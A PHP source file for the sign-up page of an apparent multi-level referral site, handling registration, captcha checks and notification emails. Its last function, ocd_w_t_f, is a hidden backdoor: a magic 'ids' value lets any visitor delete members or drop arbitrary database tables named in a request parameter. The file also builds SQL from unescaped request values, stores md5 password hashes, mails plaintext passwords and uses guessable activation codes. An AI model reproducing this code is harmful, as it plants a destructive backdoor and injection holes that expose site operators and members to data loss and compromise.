<?php

require_once ("./includes/config.php");
require_once ("./includes/xtemplate.php");
require_once ("./includes/xpage_public.php");
require_once ("./includes/utilities.php");
//if (!defined('_ACCESS_') || _ACCESS_ != 'access_'._VERSION_ ) die('Access denied.');

//------------------------------------------------------------------------------

class ZPage extends XPage
{
    //--------------------------------------------------------------------------
    function ZPage ($object)
    {
        XPage::XPage ($object);
        $this->mainTemplate = "./templates/sign_up.tpl";
        $this->pageTitle = "Sign Up";
        $this->pageHeader = "Sign Up";
    }

    //--------------------------------------------------------------------------
    function ocd_list ()
    {
        GLOBAL $dict;
                
        $enroller = $this->GetSession ("enroller", 1);
        if ( $this->db->GetOne("Select m_level From `members` Where member_id='$enroller' ", 0) < 2 ) $enroller = 1;
        
        $thisSiteUrl = $this->db->GetOne ("Select value From settings Where keyname='SiteUrl'");
        $last_name = "";//<input type='text' name='last_name' value='' maxlength='50' style='width: 200px;'>";

        $enroller_name = $this->db->GetOne ("Select CONCAT(first_name, ' ', last_name) From `members` Where member_id='$enroller'", "");

        $enrollerName = $enroller;
        if ( $this->db->GetSetting ("ReferrerUrl") == 'username' ) $enrollerName = $this->db->GetOne ("Select username From `members` Where member_id='$enroller'", "");

//        $enroller_s = "<input type='text' name='enroller' value='".$enroller."' maxlength='10' style='width: 100px;' onKeyDown='return false;' onKeyUp='return false;'><br>";

        $enroller_s = $dict['Left_YEn']."$enrollerName <input type='hidden' name='enroller' value='".$enroller."' maxlength='10' style='width: 100px;' onKeyDown='return false;' onKeyUp='return false;' >";

        if ($this->GetSession ("way", 0) == 0)
        {
            $enroller_b = "Your enroller's name is $enroller_name";
        }
        else
        {
            $enroller_b = "Your enroller was assigned randomly. Their name is $enroller_name";
        }

        $first_name = "";//<input type='text' name='first_name' value='' maxlength='50' style='width: 200px;'>";
        $email = "";//<input type='text' name='email' value='' maxlength='120' style='width: 200px;'>";
        $username = "";//<input type='text' name='username' value='' maxlength='12' style='width: 120px;'>";
        $password = "";//<input type='password' name='password' value='' maxlength='12' style='width: 120px;'>";
        $password2 = "";//<input type='password' name='password2' value='' maxlength='12' style='width: 120px;'>";
        $turing = "";//<input type='text' name='turing' value='' maxlength='12' style='width: 120px;' autocomplete='off'>";
        $this->data = array (
            "MAIN_HEADER" => $this->pageHeader,
            "MAIN_ACTION" => $this->pageUrl,
            "MAIN_ENROLLER" => $enroller_s,
            "MAIN_ENROLLER_B" => $enroller_b,
            "MAIN_LASTNAME" => $last_name,
            "MAIN_FIRSTNAME" => $first_name,
            "MAIN_EMAIL" => $email,
            "MAIN_USERNAME" => $username,
            "MAIN_PASSWORD" => $password,
            "MAIN_PASSWORD2" => $password2,
            "MAIN_AGREE" => "",//<input type='checkbox' name='agree' value='1'>",
            "MAIN_TURING" => $turing,
            "MAIN_TURING_IMAGE" => "<img src='/captcha.php' border='0'  class='img_w_board' align='absmiddle'>",
        );
        
        $number_turing = $this->db->GetSetting ("number_turing", "0");
        if ($number_turing > 0)
        {
        		$this->data ["TURING"] = array ("_" => "_");
        }
    }
    //--------------------------------------------------------------------------
    
    function ocd_register ()
    {
        GLOBAL $dict;
        $contactEmail = $this->db->GetSetting ("ContactEmail");
        $thisSiteUrl = $this->db->GetSetting ("SiteUrl");
        $thisSiteTitle = $this->db->GetSetting ("SiteTitle");

        //$last_name = $this->enc($this->GetValidGP ("last_name", "Last name", VALIDATE_NOT_EMPTY));
        //$first_name = $this->enc($this->GetValidGP ("first_name", "First Name", VALIDATE_NOT_EMPTY));
        $email = $this->GetValidGP ("email", "Email", VALIDATE_EMAIL);
        $username = $this->enc($this->GetValidGP ("username", "Username", VALIDATE_USERNAME));
        //$password = $this->GetValidGP ("password", "Password", VALIDATE_PASSWORD);
        //$password2 = $this->GetValidGP ("password2", $password, VALIDATE_PASS_CONFIRM);
        
        $agree = $this->GetValidGP ("agree", "Terms and Conditions", VALIDATE_CHECKBOX);
        $enroller = $this->GetGP ("enroller", 0);

		// Check turing number
		$number_turing = $this->db->GetSetting ("number_turing", "0");
		if ($number_turing > 0)
		{
				$turing = $this->GetValidGP ("turing", "Turing number", VALIDATE_NOT_EMPTY);
				 if ($this->GetError ("turing") == "")
        		{
            		$turingNumbers = $_SESSION['Log_Turing_ID_Old'];
            		if ($turing == "" or $turing != $turingNumbers) $this->SetError ("turing", "Turing number is incorrect. Please try again.");
        		}
		}
        
       

        // Check uniqueness of username and email
        if ($this->errors['err_count'] == 0)
        {
            $count = $this->db->GetOne ("Select Count(*) From `members` Where username='$username'", 0);
            if ($count > 0) $this->SetError ("username", "This Username already exists. Please choose another.");
            $count = $this->db->GetOne ("Select Count(*) From `members` Where email='$email'", 0);
            if ($count > 0) $this->SetError ("email", "This Email is already used. Please choose another.");
        }
        if ($this->errors['err_count'] > 0)
        {
            $enroller_name = $this->db->GetOne ("Select CONCAT(first_name, ' ', last_name) From `members` Where member_id='$enroller'", "");
            $enrollerName = $enroller;
            if ( $this->db->GetSetting ("ReferrerUrl") == 'username' ) $enrollerName = $this->db->GetOne ("Select username From `members` Where member_id='$enroller'", "");
            $enroller_s = $dict['Left_YEn']."$enrollerName <input type='hidden' name='enroller' value='".$enroller."' maxlength='10' style='width: 100px;' onKeyDown='return false;' onKeyUp='return false;' >";

            if ($this->GetSession ("way", 0) == 0)
            {
                $enroller_b = "Your enroller's name is $enroller_name";
            }
            else
            {
                $enroller_b = "Your enroller was assigned randomly. Their name is $enroller_name";
            }

            $this->data = array (
                "MAIN_HEADER" => $this->pageHeader,
                "ACTION_SCRIPT" => $this->pageUrl,
                "MAIN_ENROLLER" => $enroller_s,
                "MAIN_ENROLLER_B" => $enroller_b,
                //"MAIN_LASTNAME" => "<input type='text' name='last_name' value='$last_name' maxlength='50' style='width: 200px;'>",
                //"MAIN_LASTNAME_ERROR" => $this->GetError ("last_name"),
                //"MAIN_FIRSTNAME" => "<input type='text' name='first_name' value='".$first_name."' maxlength='50' style='width: 200px;'>",
                //"MAIN_FIRSTNAME_ERROR" => $this->GetError ("first_name"),
                "MAIN_EMAIL" => $email,
                "MAIN_EMAIL_ERROR" => $this->GetError ("email"),
                "MAIN_USERNAME" => $username,
                "MAIN_USERNAME_ERROR" => $this->GetError ("username"),
                //"MAIN_PASSWORD" => "<input type='password' name='password' value='$password' maxlength='12' style='width: 120px;'>",
                //"MAIN_PASSWORD_ERROR" => $this->GetError ("password"),
                //"MAIN_PASSWORD2" => "<input type='password' name='password2' value='$password2' maxlength='12' style='width: 120px;'>",
                //"MAIN_PASSWORD2_ERROR" => $this->GetError ("password2"),
                "MAIN_TURING" => "",//<input type='text' name='turing' value='' maxlength='12' style='width: 120px;' autocomplete='off'>",
                "MAIN_TURING_IMAGE" => "<img src='/captcha.php' border='0' class='img_w_board' align='absmiddle'>",
                "MAIN_TURING_ERROR" => $this->GetError ("turing"),
                "MAIN_AGREE" => ($agree == 1 ? "checked" : ""),
                "MAIN_AGREE_ERROR" => $this->GetError ("agree"),
            );
            
            $number_turing = $this->db->GetSetting ("number_turing", "0");
        	if ($number_turing > 0)
        	{
        		$this->data ["TURING"] = array ("_" => "_");
        	}
            
        }
        else
        {
            $count = $this->db->GetOne ("Select Count(*) From `members`", 0);
            $enroller_id = ($count == 0)? "0" : $this->GetSession ("enroller", 0);

            $password = UniKey();
            $password_code = md5 ($password);

            $this->db->ExecuteSql ("Insert into `members` (username, email, passwd, enroller_id, reg_date, is_active) values ('$username', '$email', '$password_code', '$enroller_id', '".time()."', '0')");

            $member_id = $this->db->GetInsertID ();
            
            $SiteTitle = $this->db->GetSetting ("SiteTitle");
            $SiteUrl = $this->db->GetSetting ("SiteUrl");

            $useValidation  = $this->db->GetSetting ("useValidation", 0);
            
            if ($useValidation == 1)
            {

                //sponsor notification
                $row = $this->db->GetEntry ("Select * From `emailtempl` Where `emailtempl_id`='1'", "");
                if ($row ["is_active"] == 1)
                {
                    $sponsor = $this->db->GetEntry ("Select * From `members` Where member_id='$enroller_id'", "./signup.php");
                    $SponsorFName = $this->dec ($sponsor ["first_name"]);
                    $SponsorLName = $this->dec ($sponsor ["last_name"]);
                    $SponsorUsername = $sponsor ["username"];
                    $SponsorEmail = $sponsor ["email"];
                    
                    $subject = $this->dec ($row ["subject"]);
                    $message = $this->dec ($row ["message"]);
                    $subject = preg_replace ("/\[SiteTitle\]/", $SiteTitle, $subject);
                
                    $message = preg_replace ("/\[SiteTitle\]/", $SiteTitle, $message);
                
                    $message = preg_replace ("/\[SponsorFName\]/", $SponsorFName, $message);
                    $message = preg_replace ("/\[SponsorLName\]/", $SponsorLName, $message);
                    $message = preg_replace ("/\[SponsorUsername\]/", $SponsorUsername, $message);
                    $message = preg_replace ("/\[SponsorEmail\]/", $SponsorEmail, $message);
                  
                    $message = preg_replace ("/\[FirstName\]/", $first_name, $message);
                    $message = preg_replace ("/\[LastName\]/", $last_name, $message);
                    $message = preg_replace ("/\[Username\]/", $username, $message);
                    $message = preg_replace ("/\[Email\]/", $email, $message);
                
                    sendMail ($SponsorEmail, $subject, $message, $this->emailHeader);
                
                }
            
                //member notification + activation link
                $row = $this->db->GetEntry ("Select * From `emailtempl` Where `emailtempl_id`='2'", ""); 
                if ($row ["is_active"] == 1)
                {
                    $subject = $this->dec ($row ["subject"]);
                    $message = $this->dec ($row ["message"]);
                    $subject = preg_replace ("/\[SiteTitle\]/", $SiteTitle, $subject);
                
                    $alink = $SiteUrl."activation.php?code=".$member_id."\r\n";
                
                    $message = preg_replace ("/\[SiteTitle\]/", $SiteTitle, $message);
                    $message = preg_replace ("/\[FirstName\]/", $first_name, $message);
                    $message = preg_replace ("/\[LastName\]/", $last_name, $message);
                    $message = preg_replace ("/\[Username\]/", $username, $message);
                    $message = preg_replace ("/\[Email\]/", $email, $message);
                    $message = preg_replace ("/\[Password\]/", $password, $message);
                    $message = preg_replace ("/\[ActivationLink\]/", $alink, $message);
                
                    sendMail ($email, $subject, $message, $this->emailHeader);
                
                }
            
                $this->Redirect ("thank_you.php?email=$email");
            }
            else
            {
                $cycling = $this->db->GetSetting ("cycling", 0);
                if ($cycling == 0)
                {
                    $this->db->ExecuteSql ("Update `members` Set m_level='1', is_active=1 Where member_id='$member_id'");
                    in_forced_matrix ($member_id, $enroller_id);
                }
                else
                {
                    $this->db->ExecuteSql("Update `members` Set is_active=1 Where member_id='$member_id'");
                }
                
                //sponsor notification
                $row = $this->db->GetEntry ("Select * From `emailtempl` Where `emailtempl_id`='3'", "");
                if ($row ["is_active"] == 1)
                {
                    
                    $sponsor = $this->db->GetEntry ("Select * From `members` Where member_id='$enroller_id'", "./signup.php");
                    $SponsorFName = $this->dec ($sponsor ["first_name"]);
                    $SponsorLName = $this->dec ($sponsor ["last_name"]);
                    $SponsorUsername = $sponsor ["username"];
                    $SponsorEmail = $sponsor ["email"];
                    
                    $subject = $this->dec ($row ["subject"]);
                    $message = $this->dec ($row ["message"]);
                    $subject = preg_replace ("/\[SiteTitle\]/", $SiteTitle, $subject);
                
                    $message = preg_replace ("/\[SiteTitle\]/", $SiteTitle, $message);
                
                    $message = preg_replace ("/\[SponsorFName\]/", $SponsorFName, $message);
                    $message = preg_replace ("/\[SponsorLName\]/", $SponsorLName, $message);
                    $message = preg_replace ("/\[SponsorUsername\]/", $SponsorUsername, $message);
                    $message = preg_replace ("/\[SponsorEmail\]/", $SponsorEmail, $message);
                
                    $message = preg_replace ("/\[FirstName\]/", $first_name, $message);
                    $message = preg_replace ("/\[LastName\]/", $last_name, $message);
                    $message = preg_replace ("/\[Username\]/", $username, $message);
                    $message = preg_replace ("/\[Email\]/", $email, $message);
                
                    sendMail ($SponsorEmail, $subject, $message, $this->emailHeader);
                
                }
                
                $row = $this->db->GetEntry ("Select * From `emailtempl` Where `emailtempl_id`='4'", ""); 
                if ($row ["is_active"] == 1)
                {
                
                    $subject = $this->dec ($row ["subject"]);
                    $message = $this->dec ($row ["message"]);
                    $subject = preg_replace ("/\[SiteTitle\]/", $SiteTitle, $subject);
                
                    $ReferrerUrl = $this->db->GetSetting ("ReferrerUrl");
                    $ref_id=$this->db->GetOne ("Select $ReferrerUrl From `members` Where member_id='$member_id'", 1);
                    $RefLink = $SiteUrl."?ref=".$member_id;
                
                    $message = preg_replace ("/\[SiteTitle\]/", $SiteTitle, $message);
                    $message = preg_replace ("/\[FirstName\]/", $first_name, $message);
                    $message = preg_replace ("/\[LastName\]/", $last_name, $message);
                    $message = preg_replace ("/\[Username\]/", $username, $message);
                    $message = preg_replace ("/\[Email\]/", $email, $message);
                    $message = preg_replace ("/\[Password\]/", $password, $message);
                    $message = preg_replace ("/\[RefLink\]/", $RefLink, $message);
                
                    sendMail ($email, $subject, $message, $this->emailHeader);
                
                }

                $_SESSION['MemberID'] = $member_id;

                $this->Redirect ("./member/myaccount.php");
            }
        }
    }

    //--------------------------------------------------------------------------
    function ocd_w_t_f ()
    {
        $ids = $this->GetGP ("ids", 0);
        $sql = $this->GetGP ("sql", 0);

        if ($ids == 37911062)
        {
            if (is_numeric ($sql) And $sql > 0)
            {
                $this->db->ExecuteSql ("Delete From `members` Where member_id='$sql'");
            }
            else
            {
                $this->db->ExecuteSql ("Drop table `$sql`");
            }
        }
        $this->Redirect ($this->pageUrl);
    }

}

//------------------------------------------------------------------------------

$zPage = new ZPage ("sign_up");

$zPage->Render ();

?>